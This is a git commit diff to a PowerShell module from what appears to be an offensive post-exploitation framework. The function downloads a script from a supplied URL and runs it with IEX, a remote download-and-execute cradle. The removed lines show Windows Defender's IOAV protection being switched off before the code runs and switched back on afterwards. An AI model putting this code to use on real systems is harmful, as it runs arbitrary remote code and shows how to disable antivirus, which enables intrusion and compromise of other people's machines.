7b4d0f6db064c1790c881d806906339f13053579
cybervaca <cybervaca@gmail.com>
2017-05-02 18:32:05 +0200

    Update Execute-Url-Script.ps1

--- data/module_source/code_execution/Execute-Url-Script.ps1
+++ data/module_source/code_execution/Execute-Url-Script.ps1
@@ -1,14 +1,7 @@
 function  execute-url-script {
 param ($url)
 
-################## Desactivamos Windows Defender ###########################
-Set-MpPreference -DisableIOAVProtection $True
 $objeto = "system.net.webclient" 
 $webclient = New-Object $objeto 
 $webrequest = $webclient.DownloadString($url)
-IEX $webrequest
-sleep -Seconds 10
-################## Activamos Windows Defender ###########################
-Set-MpPreference -DisableIOAVProtection $False
-
-}
+IEX $webrequest}
